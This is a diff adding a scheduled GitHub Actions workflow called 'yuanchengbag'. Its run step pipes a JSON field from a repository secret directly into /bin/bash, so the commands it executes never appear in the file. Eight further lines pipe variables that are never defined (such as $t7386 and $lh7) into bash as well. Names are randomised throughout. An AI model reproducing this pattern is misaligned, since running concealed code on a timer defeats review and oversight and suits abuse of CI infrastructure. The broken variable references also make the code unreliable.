@@ -1,0 +1,26 @@
+name: yuanchengbag
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanchengbag
+        env:
+          cfczl1188: ${{ secrets.cfczl1188 }}
+        run: |
+          echo $cfczl1188 | jq -r .akrkf013 | /bin/bash
+          echo $t7386 | jq -r .kn3674 | /bin/bash
+          echo $f48 | jq -r .fm667 | /bin/bash
+          echo $jop2 | jq -r .yxqpk4 | /bin/bash
+          echo $rrprf169 | jq -r .s94631 | /bin/bash
+          echo $fug8 | jq -r .xflux4743 | /bin/bash
+          echo $w4 | jq -r .vg0903 | /bin/bash
+          echo $hu19 | jq -r .x25 | /bin/bash
+          echo $lh7 | jq -r .dlsmg6010 | /bin/bash
+
